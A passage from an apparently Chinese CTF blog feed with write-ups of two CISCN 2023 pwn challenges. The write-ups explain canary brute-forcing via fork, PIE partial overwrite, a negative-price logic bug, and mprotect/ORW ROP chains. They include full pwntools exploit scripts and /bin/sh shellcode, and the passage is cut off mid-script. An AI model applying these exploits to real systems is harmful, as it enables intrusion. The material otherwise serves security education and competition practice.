            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CISCN 2023】funcanary</title>
      <link href="/posts/29b86fa0.html"/>
      <url>/posts/29b86fa0.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>通过 <code>fork()</code> 函数产生的 canary 金丝雀的值可以通过 one-by-one 爆破</mark>，canary 的最后一字节为 <code>b&#39;\x00&#39;</code>，对于 64 位程序需要爆破出前七个字节</p></li><li><p><mark>开启 PIE 地址随机化时，可以利用 PIE 的漏洞，即：<strong>地址的低三位不会发生改变</strong>，可以对地址进行爆破</mark></p></li><li><p><mark>在爆破 canary 和 真实地址时，发送数据用 <code>io.send()</code>，不可以用 <code>io.sendline()</code></mark>，否则会将爆破的下一位修改为回车符（<code>0x0a</code>），导致爆破失败</p></li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】funcanary</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary1.png" alt="CISCN2023-funcanary1.png"></p><p>权限开满了</p><p>丢到 IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary2.png" alt="CISCN2023-funcanary2.png"></p><p>发现程序会使用 <code>fork()</code> 生成子进程，注意：<strong>子进程崩溃不会导致父进程退出</strong></p><p>跟进 <code>sub_128A()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary3.png" alt="CISCN2023-funcanary3.png"></p><p>在输入 <code>buf</code> 处存在溢出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary4.png" alt="CISCN2023-funcanary4.png"></p><p>但是有 canary 金丝雀保护</p><p>在函数列表中查找后门函数无果</p><p>查看字符串，发现 <code>&#39;/bin/cat flag&#39;</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary5.png" alt="CISCN2023-funcanary5.png"></p><p>跟进位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary6.png" alt="CISCN2023-funcanary6.png"></p><p>发现有 <code>system(&quot;/bin/cat flag&quot;)</code></p><p>所以思路很清晰了，就是首先通过 one-by-one 爆破 canary 绕过金丝雀，然后通过 <code>buf</code> 的溢出跳转到后门函数执行 <code>system(&quot;/bin/cat flag&quot;)</code></p><blockquote><p><strong>注意：</strong><br>通过 <code>fork()</code> 函数产生的 canary 金丝雀的值是固定不变的 <em>（同一个进程中的不同线程的 canary 是相同的）</em>，因为子进程会完全复制父进程地址空间的内容，所以可以爆破 canary 的值，利用子进程进行溢出，每次只溢出一个字节，直到溢出的这一个字节值是正确的，再溢出下一个字节</p><p>由于 canary 的低一位字节固定为 <code>&quot;\00&quot;</code>，因此只需要爆破前七位字节，如此反复直到爆破完七位即可得到 canary 的值，每一字节的取值范围在 <code>0 ~ 255</code></p></blockquote><p>由于还开启了 PIE 地址随机化，所以后门函数的地址 <code>0x1231</code> 不是真实地址，但是可以利用 PIE 地址随机化的漏洞<br>即：<strong>地址的低三位不会发生改变</strong></p><blockquote><p><code>partial write</code>（部分写入）是一种利用了 PIE 技术缺陷的 bypass 技术</p><p>由于内存的分页管理机制，如果开启 PIE 保护的话，只能影响到单个内存页，一个内存页大小为 <code>0x1000</code>，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数是始终不变的</p></blockquote><p>因此，根据后门函数的地址 <code>0x1231</code> 可以推断，后门函数的真实地址为 <code>0xn231</code>，其中 <code>n</code> 就是需要爆破的值，取值范围在 <code>0 ~ 15</code></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/funcanary"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.106.84.217"</span><span class="token punctuation">,</span> <span class="token number">26433</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/funcanary"</span><span class="token punctuation">)</span><span class="token comment"># 爆破 canary</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        canary <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x70</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 注意不能用 sendline，不能添加换行符，否则 canary 永远不正确</span>        s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># b'welcome\n'</span>        s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># b'*** stack smashing detected ***: terminated\n'</span>        <span class="token keyword">if</span> <span class="token string">b'stack smashing detected'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>            canary <span class="token operator">=</span> canary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"成功找到第 "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 个字节"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary："</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token comment"># 爆破后门函数地址</span>address <span class="token operator">=</span> <span class="token string">b'\x31'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    address <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x10</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 构造 b'\xi2'，即 address = p64(0xi231)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x70</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> address    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 注意不能用 sendline，不能添加换行符</span>    s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        address <span class="token operator">=</span> address<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">continue</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary8.png" alt="CISCN2023-funcanary8.png"></p><p>爆破出 canary：<code>b&#39;\x00&#125;&#123;\xa1K\xc8\xbf\xe5&#39;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary7.png" alt="CISCN2023-funcanary7.png"></p><p>可以看到爆破出的地址为：<code>0xf231</code></p><p>执行后门函数的 <code>system(&quot;/bin/cat flag&quot;)</code> 获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CISCN 2023】烧烤摊儿</title>
      <link href="/posts/de7311e3.html"/>
      <url>/posts/de7311e3.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>通过 <code>scanf()</code> 输入的数据可以作为溢出点</mark></p></li><li><p><mark>使用 <code>ret2shellcode（mprotect 修改权限）</code>、<code>ORW</code>、<code>ret2syscall</code> 三种方法 get shell</mark></p></li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】烧烤摊儿</a></p><hr><h1 id="思路一-mprotect"><a href="#思路一-mprotect" class="headerlink" title="思路一 (mprotect)"></a>思路一 (mprotect)</h1><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF1.png" alt="CISCN2023-烧烤摊儿1.png"></p><p>开启了金丝雀和栈不可执行</p><p>根据程序运行时的输出，在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF2.png" alt="CISCN2023-烧烤摊儿2.png"></p><p>其中，目录 <code>menu()</code> 的输出为：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF3.png" alt="CISCN2023-烧烤摊儿3.png"></p><p>查看各个目录项的功能：<br>① <code>pijiu()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF4.png" alt="CISCN2023-烧烤摊儿4.png"></p><p>② <code>chuan()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF5.png" alt="CISCN2023-烧烤摊儿5.png"></p><p>③ <code>yue()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF6.png" alt="CISCN2023-烧烤摊儿6.png"></p><p>④ <code>vip()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF7.png" alt="CISCN2023-烧烤摊儿7.png"></p><p>⑤ <code>gaiming()</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF8.png" alt="CISCN2023-烧烤摊儿8.png"></p><p>发现在 <code>gaiming()</code> 函数中，有将用户的输入 <code>v5</code> 赋值给全局变量 <code>name</code> 的操作<br>同时没有对 <code>v5</code> 的长度进行限制，存在栈溢出漏洞</p><p>需覆盖 0x28 个数据到达返回地址处：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF15.png" alt="CISCN2023-烧烤摊儿15.png"></p><p>跟进发现全局变量 <code>name</code> 在 .data 段上：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF9.png" alt="CISCN2023-烧烤摊儿9.png"></p><p>于是考虑将 shellcode 写到这里</p><p>用 gdb 查看权限：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF10.png" alt="CISCN2023-烧烤摊儿10.png"></p><p>全局变量 <code>name</code> 的地址 <code>0x4E60F0</code> 在 <code>0x4e6000 ~ 0x4e9000</code> 之间，Perm 为 <code>rw-p</code> 没有执行权限<br>但考虑到程序中有 <code>mprotect()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF11.png" alt="CISCN2023-烧烤摊儿11.png"></p><p>可以用 <code>mprotect()</code> 函数为该段地址增加执行权限</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF12.png" alt="CISCN2023-烧烤摊儿12.png"></p><p><code>mprotect()</code> 函数的起始地址为 <code>0x458b00</code></p><p>使用 <code>ROPgadget --binary shaokao --only &#39;pop|ret&#39; | grep &#39;pop&#39;</code> 搜索可利用的 ROP：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF13.png" alt="CISCN2023-烧烤摊儿13.png"></p><p><code>mprotect()</code> 需要三个参数，分别是：<br>① <code>rdi</code>：要修改的内存页首地址 <strong>（我这里将 <code>0x4e6000 ~ 0x4e9000</code> 这段地址全部改为 rwx 权限）</strong><br>② <code>rsi</code>：要修改的内存页大小 <strong>（我这里段长度为 0x3000）</strong><br>③ <code>rdx</code>：要修改的权限 <strong>（其中 r : 4，w : 2，x : 1，因此 rwx 为 4 + 2 + 1 &#x3D; 7）</strong></p><p>同时，获取返回地址 <code>ret</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF14.png" alt="CISCN2023-烧烤摊儿14.png"></p><p>经过分析可知，要想执行 <code>gaiming()</code> 中的栈溢出漏洞，首先要让 <code>own = 1</code>，只有在 <code>vip()</code> 中可以修改 <code>own</code> 的值为 1</p><p>首先需要买下摊位，要求余额 <code>money &gt; 100000</code>，而 <code>money</code> 的初始值为 233<br>发现在购买逻辑中存在漏洞：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF17.png" alt="CISCN2023-烧烤摊儿17.png"></p><p>当 <code>v9</code> 为负数时，可以让 <code>money</code> 增长，超过 100000 即可</p><p>因此，思路如下：<br>① 首先通过购买的逻辑漏洞使余额 <code>money &gt; 100000</code>，买下摊位，进入 <code>gaiming()</code> 函数<br>② 然后利用 <code>mprotect()</code> 函数给 <code>name</code> 所在的 .data 段增加执行权限<br>③ 最后通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 shellcode，并溢出 <code>v5</code> 执行 shellcode</p><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>ret_addr <span class="token operator">=</span> <span class="token number">0x40101a</span>mprotect_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>  <span class="token comment"># 0x458b00</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>  <span class="token comment"># 0x401B45</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4E6000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 布置mprotect()函数的参数</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mprotect_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>  <span class="token comment"># 跳转到mprotect()函数后返回到main()函数</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>payload <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 补齐0x28个填充数据到达返回地址处</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>  <span class="token comment"># 跳转到shellcode处执行</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF16.png" alt="CISCN2023-烧烤摊儿16.png"></p><hr><h1 id="思路二-ORW"><a href="#思路二-ORW" class="headerlink" title="思路二 (ORW)"></a>思路二 (ORW)</h1><p>在思路一中买下摊位执行 <code>gaiming()</code> 函数后<br>由于程序中包含 <code>open64()</code>、<code>read()</code>、<code>write()</code> 函数<br>因此还可以利用 <code>v5</code> 的溢出使用 ORW 读出 flag</p><p>确定 ORW 三个函数的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF18.png" alt="CISCN2023-烧烤摊儿18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF19.png" alt="CISCN2023-烧烤摊儿19.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF20.png" alt="CISCN2023-烧烤摊儿20.png"></p><table><thead><tr><th align="left">函数</th><th align="left">地址</th></tr></thead><tbody><tr><td align="left"><code>open64()</code></td><td align="left">0x457C90</td></tr><tr><td align="left"><code>read()</code></td><td align="left">0x457DC0</td></tr><tr><td align="left"><code>write()</code></td><td align="left">0x457E60</td></tr></tbody></table><p>首先需要通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 <code>b&#39;./flag\x00\x00&#39;</code>，并将 <code>b&#39;./flag\x00\x00&#39;</code> 作为 <code>open64()</code> 函数的参数，构造 <code>open(b&#39;./flag\x00\x00&#39;, 0)</code> 用于打开当前目录下名为 flag 的文件，其中 0 表示只读方式打开</p><p>然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端</p><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>open64_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token comment"># open(b'./flag\x00\x00', 0)</span>ORW <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open64_addr<span class="token punctuation">)</span><span class="token comment"># read(3, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token comment"># write(1, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token 